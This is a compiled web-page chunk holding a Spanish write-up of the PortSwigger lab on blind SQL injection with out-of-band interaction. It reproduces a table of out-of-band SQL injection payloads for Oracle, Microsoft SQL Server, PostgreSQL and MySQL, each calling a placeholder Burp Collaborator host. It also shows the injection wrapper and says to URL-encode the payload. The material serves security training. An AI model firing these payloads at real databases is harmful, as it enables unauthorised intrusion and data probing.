import{_ as e,o as i,c as a,ai as o,ar as n,as as r}from"./chunks/framework.DIUhWiTt.js";const b=JSON.parse('{"title":"Blind SQL injection with out-of-band interaction - portswigger","description":"","frontmatter":{"title":"Blind SQL injection with out-of-band interaction - portswigger","date":"2024-08-04T00:00:00.000Z","categories":["Write up","portswigger"],"tags":["sql injection"]},"headers":[],"relativePath":"notas/PortSwigger/1.SQL_Injection/14.Lab_Blind_SQL_injection_with_out-of-band_interaction/Lab_Blind_SQL_injection_with_out-of-band_interaction.md","filePath":"notas/PortSwigger/1.SQL_Injection/14.Lab_Blind_SQL_injection_with_out-of-band_interaction/Lab_Blind_SQL_injection_with_out-of-band_interaction.md"}'),s={name:"notas/PortSwigger/1.SQL_Injection/14.Lab_Blind_SQL_injection_with_out-of-band_interaction/Lab_Blind_SQL_injection_with_out-of-band_interaction.md"};function d(l,t,c,p,u,h){return i(),a("div",null,[...t[0]||(t[0]=[o('<h1 id="lab-blind-sql-injection-with-out-of-band-interaction" tabindex="-1">Lab: Blind SQL injection with out-of-band interaction <a class="header-anchor" href="#lab-blind-sql-injection-with-out-of-band-interaction" aria-label="Permalink to “Lab: Blind SQL injection with out-of-band interaction”">​</a></h1><p>Puede hacer que la base de datos realice una búsqueda de DNS en un dominio externo. Para ello, deberá utilizar <a href="https://portswigger.net/burp/documentation/desktop/tools/collaborator" target="_blank" rel="noreferrer">Burp Collaborator</a> para generar un subdominio exclusivo de Burp Collaborator que utilizará en su ataque y, luego, sondear el servidor de Collaborator para confirmar que se realizó una búsqueda de DNS.</p><table tabindex="0"><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>Oracle</td><td><p>( <a href="https://portswigger.net/web-security/xxe">XXE</a> ) vulnerabilidad que activa una búsqueda de DNS. La vulnerabilidad ha sido corregida, pero existen muchas instalaciones de Oracle sin parches:<br><br><code>SELECT EXTRACTVALUE(xmltype(&#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;<a href="http://BURP-COLLABORATOR-SUBDOMAIN/" target="_blank" rel="noreferrer">http://BURP-COLLABORATOR-SUBDOMAIN/</a>&quot;&gt; %remote;]&gt;&#39;),&#39;/l&#39;) FROM dual</code><br><br>La siguiente técnica funciona en instalaciones de Oracle con todos los parches aplicados, pero requiere privilegios elevados:<br><br><code>SELECT UTL_INADDR.get_host_address(&#39;BURP-COLLABORATOR-SUBDOMAIN&#39;)</code></p></td></tr><tr><td>Microsoft</td><td><code>exec master..xp_dirtree &#39;//BURP-COLLABORATOR-SUBDOMAIN/a&#39;</code></td></tr><tr><td>PostgreSQL</td><td><code>copy (SELECT &#39;&#39;) to program &#39;nslookup BURP-COLLABORATOR-SUBDOMAIN&#39;</code></td></tr><tr><td>MySQL</td><td><p>Las siguientes técnicas funcionan sólo en Windows:<br><br><code>LOAD_FILE(&#39;\\\\BURP-COLLABORATOR-SUBDOMAIN\\a&#39;)</code><br><code>SELECT ... INTO OUTFILE &#39;\\\\BURP-COLLABORATOR-SUBDOMAIN\\a&#39;</code></p></td></tr><tr><td></td><td></td></tr></tbody></table><p>Para este ejercicio debemos de tener en cuenta la anterior tabla. Ademas, tenemos que tener la version pro de <code>burpsuite</code> ya que haremos uso de <code>Burp Collaborator client</code>.</p><p>Haremos uso de la siguiente consulta:</p><div class="language-c"><button title="Copy Code" class="copy"></button><span class="lang">c</span><pre class="shiki shiki-themes github-light github-dark" style="--shiki-light:#24292e;--shiki-dark:#e1e4e8;--shiki-light-bg:#fff;--shiki-dark-bg:#24292e;" tabindex="0" dir="ltr"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">SELECT </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">EXTRACTVALUE</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">xmltype</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://BURP-COLLABORATOR-SUBDOMAIN/&quot;&gt; %remote;]&gt;&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">),</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;/l&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">) FROM dual</span></span></code></pre></div><p>La anterior consulta la pondremos en el campo que es vulnerable pero dentro de <code>&#39; || (&lt;query&gt;)-- -</code></p><p><img src="'+n+'" alt="20240805124630.png"></p><p>Luego tenemos que ponerlo en url encode para que no nos genere ningún error y enviamos la petición</p><p><img src="'+r+'" alt="20240805124557.png"></p>',10)])])}const g=e(s,[["render",d]]);export{b as __pageData,g as default};
